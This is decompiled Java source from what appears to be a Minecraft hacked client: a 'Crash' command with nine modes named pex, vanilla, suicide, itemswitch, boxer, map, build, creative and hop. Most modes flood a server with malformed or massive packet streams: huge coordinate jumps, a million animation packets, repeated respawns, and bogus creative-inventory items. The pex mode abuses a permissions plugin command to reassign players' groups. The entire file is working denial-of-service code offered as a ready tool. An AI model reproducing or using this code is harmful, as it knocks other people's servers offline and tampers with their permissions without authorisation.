/*
 * Decompiled with CFR 0.152.
 */
package com.gitlab.nuf.exeter.command.impl.server;

import com.gitlab.nuf.api.stopwatch.Stopwatch;
import com.gitlab.nuf.exeter.command.Argument;
import com.gitlab.nuf.exeter.command.Command;
import java.util.Objects;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C09PacketHeldItemChange;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.play.client.C16PacketClientStatus;

public final class Crash
extends Command {
    private final Stopwatch stopwatch = new Stopwatch();

    public Crash() {
        super(new String[]{"crash", "c"}, new Argument("type|list"));
    }

    @Override
    public String dispatch() {
        switch (this.getArgument("type|list").getValue()) {
            case "pex": {
                String[] abc;
                for (String initial : abc = new String[]{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "w", "x", "y", "z"}) {
                    if (!this.stopwatch.hasCompleted(500L)) continue;
                    this.minecraft.thePlayer.sendChatMessage(String.format("/pex user %s group set Number", initial));
                    this.stopwatch.reset();
                }
                break;
            }
            case "vanilla": {
                for (int index = 0; index < 999; ++index) {
                    this.minecraft.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.minecraft.thePlayer.posX + (double)(99999 * index), this.minecraft.thePlayer.getEntityBoundingBox().minY + (double)(99999 * index), this.minecraft.thePlayer.posZ + (double)(99999 * index), true));
                }
                break;
            }
            case "suicide": {
                for (int index = 0; index < 2500; ++index) {
                    this.minecraft.thePlayer.sendChatMessage("/suicide");
                    this.minecraft.getNetHandler().addToSendQueue(new C16PacketClientStatus(C16PacketClientStatus.EnumState.PERFORM_RESPAWN));
                }
                break;
            }
            case "itemswitch": {
                for (int index = 0; index < 100000; ++index) {
                    this.minecraft.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(2));
                    this.minecraft.getNetHandler().addToSendQueue(new C03PacketPlayer(true));
                    this.minecraft.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(2));
                    this.minecraft.getNetHandler().addToSendQueue(new C03PacketPlayer(true));
                }
                break;
            }
            case "boxer": {
                for (int index = 0; index < 1000000; ++index) {
                    this.minecraft.getNetHandler().addToSendQueue(new C0APacketAnimation());
                }
                break;
            }
            case "map": {
                for (int index = 0; index < 100000; ++index) {
                    this.minecraft.getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(36, new ItemStack(Items.map)));
                    this.minecraft.getNetHandler().addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.beef)));
                }
                break;
            }
            case "build": {
                for (int index = 0; index < 10000; ++index) {
                    this.minecraft.getNetHandler().addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.apple)));
                }
                break;
            }
            case "creative": {
                int index;
                ItemStack plant = new ItemStack(Blocks.double_plant);
                plant.stackSize = 64;
                plant.setItemDamage(69);
                for (index = 0; index < 9; ++index) {
                    ItemStack is2 = this.minecraft.thePlayer.inventory.getStackInSlot(index);
                    if (!Objects.nonNull(is2) || Item.getIdFromItem(is2.getItem()) != 175 || is2.getItemDamage() != 1337 || is2.stackSize == 64) continue;
                    this.minecraft.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(this.minecraft.thePlayer.inventory.currentItem + 36, plant));
                    this.minecraft.thePlayer.inventory.setInventorySlotContents(this.minecraft.thePlayer.inventory.currentItem, plant);
                }
                if (Objects.isNull(this.minecraft.thePlayer.getHeldItem())) {
                    this.minecraft.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(this.minecraft.thePlayer.inventory.currentItem + 36, plant));
                    this.minecraft.thePlayer.inventory.setInventorySlotContents(this.minecraft.thePlayer.inventory.currentItem, plant);
                }
                for (index = 0; index < 9; ++index) {
                    if (!Objects.isNull(this.minecraft.thePlayer.inventory.getStackInSlot(index)) && Item.getIdFromItem(this.minecraft.thePlayer.inventory.getStackInSlot(index).getItem()) != 0) continue;
                    this.minecraft.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(index + 36, plant));
                    this.minecraft.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(this.minecraft.thePlayer.inventory.currentItem + 36, plant));
                }
                break;
            }
            case "hop": {
                for (int index = 0; index < 1000; ++index) {
                    this.minecraft.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.minecraft.thePlayer.posX, this.minecraft.thePlayer.posY + 0.1, this.minecraft.thePlayer.posZ, true));
                    this.minecraft.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.minecraft.thePlayer.posX, this.minecraft.thePlayer.posY, this.minecraft.thePlayer.posZ, true));
                }
                break;
            }
            case "list": {
                return "Crashes (9): pex, vanilla, suicide, itemswitch, boxer, map, build, creative, hop";
            }
        }
        return "Attempting to crash...";
    }
}

